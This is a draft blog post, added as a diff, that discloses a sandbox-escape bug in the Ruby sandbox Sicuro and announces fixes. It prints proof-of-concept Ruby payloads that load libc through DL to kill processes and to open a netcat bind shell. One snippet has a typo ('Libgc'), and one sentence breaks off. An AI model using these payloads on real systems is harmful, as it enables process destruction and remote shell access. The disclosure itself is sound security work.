@@ -1,0 +1,76 @@
+---
+title: Sicuro's Latest Security Bug
+tags: sicuro security bug
+layout: post
+draft: true
+---
+
+[Jens Nockert](http://twitter.com/jensnockert) has exposed a rather major security hole in Sicuro.
+
+Under basically any circumstances, Sicuro can be used to execute untrusted code. The demonstrated technique used by Jens was to terminate all processes that can be terminated by the user who the initial `Sicuro#eval` call was made under. I believe it may also be possible to perform some 
+
+# The main problem
+
+It appears that attempts at making it more efficient have actually left Sicuro wide open to abuse. There was an attempt to make it lazily load trusted components, and that seems to have opened up a bug letting you `require` anything in the stdlib, including DL. DL is used for loading shared objects and calling functions in them.
+
+The following is the relevant part of the code for lazily loading trusted components. You can view it in context in [lib/sicuro/base.rb](https://github.com/duckinator/sicuro/blob/761e955fbbba07638d69bc62159199cdf0716a7d/lib/sicuro/base.rb#L254-256), lines 254 through 256.
+
+<code>
+# Without Gem we won't require unresolved gems, therefore we restore the original require.
+# This allows us to lazy-require other trusted components from the same $LOAD_PATH.
+::Kernel.module_eval { alias require gem_original_require }
+</code>
+
+Following is a tidied up version of the code that exposed the bug.
+
+<code>
+require 'dl'
+require 'dl/import'
+
+module Libc
+  extend DL::Importer
+  dlload '/lib/libc.so.6'
+  extern 'int kill(int, int)'
+end
+
+Libc.kill(0, 9)
+</code>
+
+Changing `Libc.kill(0, 9)` to `Libc.kill(-1, 9)` will terminate _all processes the user who made the call to `Sicuro.eval` can terminate._
+
+Here is similar code that will allow you to execute arbitrary shell code:
+
+<code>
+require 'dl'
+require 'dl/import'
+
+module Libc
+  extend DL::Importer
+  dlload '/lib/libc.so.6'
+  extern 'int system(const char*)'
+end
+
+Libgc.system('nc -lp 1337 -e /bin/bash &amp;')
+</code>
+
+Congratulations, you now can run `netcat $IP 1337` to connect.
+
+There's a video at the bottom, but odds are it's entirely unintelligible, so you can [go directly to the video](/assets/sicuro-untrusted-code-execution-bug.ogv).
+
+It may also be possible to escalate privileges using this.
+
+# The small problem
+
+There's always something hiding, right? That little thing you find when hunting another bug. This one happened to be that `GC`, `Signal`, and `ObjectSpace` were whitelisted. This isn't exactly good.
+
+At the very least, `GC.disable` could make it use too much memory, causing instability, and `Signal.trap` could be used to handle signals used to terminate the process -- and ignore them. I'm not entirely sure what `ObjectSpace` can be used for, but I do not know what it does, so I do not like it being whitelisted. I've also been told `ObjectSpace` is "dangerous." I may look into this later.
+
+`GC`, `Signal`, and `ObjectSpace` will not be whitelisted as of the next version.
+
+# Conclusion
+
+While removing things from the whitelist was beyond trivial, it appears fixing the code execution problem is proving immensely difficult. I am not sure I will be able to do it and retain all current functionality.
+
+I highly recommend that, once the next version is released, everyone upgrade immediately. This is a major security hole, and allows execution of any untrusted code that can be done through a shared library. This includes calls to `execve()` and related functions, as mentioned above.
+
+<video style="width: 100%; max-width: 798px;" controls="controls" src="/assets/sicuro-untrusted-code-execution-bug.ogv"></video>
